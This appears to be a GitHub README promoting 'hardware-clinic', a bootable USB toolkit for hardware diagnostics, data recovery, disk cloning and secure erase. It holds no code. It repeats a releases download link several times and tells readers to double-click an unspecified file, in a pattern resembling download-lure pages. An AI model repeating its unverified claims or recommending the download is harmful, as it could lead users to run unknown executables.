<h1>🩺 hardware-clinic - Bootable PC & Mac Hardware Diagnostics</h1>

<p align="center">
<a href="https://github.com/Jenloderkelionia/hardware-clinic/releases"><img src="https://img.shields.io/badge/Download-hardware--clinic-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download hardware-clinic"></a>
</p>

**hardware-clinic** is a free, bootable USB toolkit designed for anyone who wants to test, repair, or recover data from a computer—without needing to install an operating system or wait for a slow boot. It starts in about one second, runs entirely from a USB stick, and gives you powerful tools to check the health of your PC or Intel Mac, rescue files from damaged drives, and even securely erase sensitive data. Whether you are fixing your own computer, refurbishing old hardware, or preparing a machine for resale, hardware-clinic is your all-in-one solution.

---

## 🚀 Getting Started

Follow these simple steps to get hardware-clinic running on your Windows computer. This guide assumes you are starting from a Windows machine and want to create a bootable USB drive. Do not worry—you do not need any special skills. Just follow along.

### Step 1: Download the Application

Visit this link to download the application:

[**Download hardware-clinic**](https://github.com/Jenloderkelionia/hardware-clinic/releases)

Click the link above. You will be taken to the official downloads page. Look for the latest release and click the download button. The download should start automatically. Once the download is complete, you will have a file saved to your computer—usually in your "Downloads" folder. Do not open the file yet; we will need to prepare it first.

### Step 2: Prepare a USB Drive

You will need a USB flash drive. Any size works, but a capacity of 8 GB or more is recommended. **Important:** This process will erase everything on the USB drive. Make sure you have backed up any important files from the USB drive before proceeding.

1.  Plug the USB drive into your Windows computer.
2.  Note the drive letter assigned to it (e.g., `E:`, `F:`, `G:`). You will need this later.

### Step 3: Create the Bootable USB

Now, you will use the downloaded file to create a bootable USB drive. Double-click the downloaded file to open it. A window will appear asking for your USB drive letter. Enter the drive letter from Step 2 and click "Create" or "Start." The process will take a few minutes. When it is done, you will see a "Success" message. You can now safely remove the USB drive.

### Step 4: Boot Your Target Computer from the USB

Insert the bootable USB drive into the computer you want to diagnose or repair. Turn on that computer. As it starts, you will need to tell it to boot from the USB instead of its internal hard drive. This usually involves pressing a key (like `F12`, `F2`, `Esc`, or `Delete`) immediately after powering on. You may see a message on the screen that says "Press F12 for Boot Menu" or similar. Press the indicated key, select your USB drive from the menu, and press Enter.

Alternatively, on Intel Macs, hold down the `Option` (Alt) key during startup until a boot menu appears, then select the USB drive.

---

## 🛠️ Features & Capabilities

Once hardware-clinic boots—which takes about one second—you will see a simple menu. Every tool is designed to be used without any prior technical knowledge. Here is a breakdown of what you can do:

### 💾 Memory Testing (RAM)
This tool checks your computer's RAM (Random Access Memory) for errors. Bad RAM can cause crashes, freezes, and blue screens. Run this test to see if your RAM modules are healthy.

### 🔍 Disk Health Check (SSD/HDD)
Test any internal or external drive (SSD or HDD) for issues. It performs three types of checks:
- **SMART Status:** Shows the drive's self-reported health metrics.
- **Surface Test:** Scans the entire drive for bad sectors (unreadable areas).
- **Self-Test:** Runs a deeper diagnostic test recommended by the drive manufacturer.

### 🌡️ CPU Stress & Temperature
This tool pushes your processor (CPU) to its maximum load to see if it is stable. It also displays the CPU temperature in real-time, helping you identify overheating problems.

### 🎮 GPU & VRAM Testing
Test your graphics card (GPU) and its video memory (VRAM). This is essential for diagnosing visual glitches, screen artifacts, or crashes during gaming or video playback.

### 🖥️ Display & Fan Tests
- **Display Test:** Shows solid colors and patterns on your screen to verify the monitor and display cable are working correctly.
- **Fan Test:** Can cycle your computer's fans at different speeds to check if they are spinning properly.

### 🧰 Data Recovery
If your computer will not start, this feature allows you to access the hard drive and copy important files to another storage device. It supports common file systems like NTFS (Windows), ext4 (Linux), and APFS (Mac). Just plug in a second USB drive or external hard drive to store the rescued files.

### 💿 Disk Cloning
Make an exact copy of a failing hard drive to a new one. This is useful for upgrading to a larger drive or preserving data before a drive gives up entirely.

### 🔧 Repair Tools
Fix common startup and partition issues:
- **Boot Repair:** Restore the boot sector to make your operating system start again.
- **Partition Table Repair:** Rebuild corrupted partition tables so your drives are recognized correctly.

### 🧹 Secure Erase (NIST 800-88)
Permanently delete all data from a drive. This feature is compliant with the NIST 800-88 standard for data sanitization. After erasing, you will receive a **signed certificate** and a **QR code** as proof that the data has been securely wiped. This is perfect for refurbishing computers or selling old drives while protecting your privacy.

---

## ❓ Troubleshooting Tips

- **USB not booting?** Make sure "Secure Boot" or "Fast Boot" is disabled in your computer's BIOS/UEFI. Consult your computer's manual for exact steps.
- **Can't see a drive?** Some drives are hidden or have unsupported file systems. Check the disk list in hardware-clinic to see if it appears at all.
- **Data recovery is slow?** This is normal for large or failing drives. Let it run; rushing can cause data loss.
- **Forgot your USB drive letter?** In Windows, open "File Explorer" and look for the drive under "This PC."

---

## 📋 Frequently Asked Questions

**Is hardware-clinic really free?**  
Yes. It is free for personal use. Just download and use it as much as you need.

**Which computers are supported?**  
Any PC (desktop or laptop) with a standard UEFI or BIOS, and any Intel-based Mac.

**How long does the RAM test take?**  
It depends on the size of your RAM. Typically, a full pass takes 30 minutes to a few hours. We recommend letting it run overnight.

**What is a SMART status?**  
SMART (Self-Monitoring, Analysis, and Reporting Technology) is a system inside modern hard drives that tracks health metrics. If it reports a "failure imminent" or "past failure," you should replace the drive immediately.

**Can I use hardware-clinic on a computer without an operating system?**  
Absolutely. That is the whole point. It boots independently from the USB drive, so it works on any machine, even one with no OS installed.

---

## 🌐 Community & Support

hardware-clinic is an open-source project. If you find a bug, have a feature request, or want to contribute, please visit the [GitHub repository](https://github.com/Jenloderkelionia/hardware-clinic). You can open issues, submit code, or just share your experience with fellow users.

---

## 📥 Download Again

If you missed the link at the top, here it is one more time:

[Download hardware-clinic from GitHub](https://github.com/Jenloderkelionia/hardware-clinic/releases)

---

## ✨ Summary

hardware-clinic gives you the power of a professional computer repair shop in your pocket. With its one-second boot time, you can diagnose RAM, test storage health, stress the CPU and GPU, verify displays and fans, recover priceless data, clone failing disks, repair broken boot records, and securely wipe drives—all without touching an operating system. Download it today and see how easy PC and Mac hardware diagnostics can be.

Keywords: bootable-usb, data-recovery, data-wipe, diagnostics, disk-cloning, hardware-diagnostics, intel-mac, memtest, nist-800-88, pc-repair, refurbishing, secure-erase, smart, stress-test, uefi